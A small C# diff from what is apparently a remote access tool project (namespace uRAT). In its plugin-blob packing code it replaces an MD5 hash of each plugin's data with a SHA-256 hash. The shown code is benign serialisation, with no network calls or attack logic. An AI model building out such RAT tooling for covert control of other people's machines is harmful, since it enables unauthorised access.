@@ -69,7 +69,7 @@ namespace uRAT.Client.Tools.Blob
                     offsets.Add(plugin.Value.PluginGuid,
                         new PluginOffsetSizePair((int) ms.Position, plugin.Value.Data.Length));
                     ms.Write(plugin.Value.PluginGuid.ToByteArray(), 0, 16);
-                    ms.Write(HashHelper.CalculateMd5(plugin.Value.Data), 0, 16);
+                    ms.Write(HashHelper.CalculateSha256(plugin.Value.Data), 0, 32);
                     ms.Write(plugin.Value.Data, 0, plugin.Value.Data.Length);
                 }
                 dataBlock = ms.ToArray();
